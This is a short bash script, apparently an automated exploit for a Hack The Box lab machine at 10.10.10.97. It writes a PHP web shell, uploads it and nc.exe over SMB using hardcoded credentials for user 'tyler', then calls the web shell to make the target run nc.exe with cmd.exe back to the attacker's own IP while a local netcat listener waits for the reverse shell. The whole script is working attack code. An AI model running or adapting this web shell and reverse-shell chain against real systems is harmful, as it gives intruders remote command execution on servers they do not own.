#!/bin/bash

ip=$(ifconfig tun0 | grep inet | head -1 | xargs | cut -d " " -f 2)
port=9191

GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${GREEN}[*]${NC} Creating the PHP backdoor and nc.exe..."
echo "<?php echo system(\$_REQUEST['cmd']);?>" > backdoor.php
echo -e "${GREEN}[*]${NC} Uploading files to the remote server..."
smbclient -W 'HTB' //'10.10.10.97'/new-site -U 'tyler'%'92g!mA8BGjOirkL%OG*&' -c 'put backdoor.php; put /usr/share/windows-binaries/nc.exe nc.exe' &> /dev/null
( sleep 2; rm backdoor.php; curl -s "http://10.10.10.97:8808/backdoor.php?cmd=c:\inetpub\new-site\nc.exe%20$ip%20$port%20-e%20c:\windows\system32\cmd.exe" &> /dev/null) &
echo -e "${GREEN}[*]${NC} Started listener at port $port..."
echo -e "${GREEN}[*]${NC} Triggering reverse shell..."
nc -lnp $port
